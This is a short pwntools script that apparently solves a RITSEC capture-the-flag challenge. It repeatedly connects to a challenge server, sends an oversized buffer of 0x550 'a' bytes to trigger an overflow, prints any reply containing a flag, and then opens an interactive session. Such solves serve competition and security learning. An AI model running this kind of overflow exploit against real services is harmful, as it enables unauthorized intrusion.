#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4000

host = 'fun.ritsec.club'
port = 1338

now = 0x150
while 1:
    r = remote(host, port)

    r.recvuntil('...')
    r.send('a'*0x550)
    x = r.recvuntil('Bye.')
    if '{' in x:
        print (len(x))
        print x
        break
    r.close()
r.interactive()
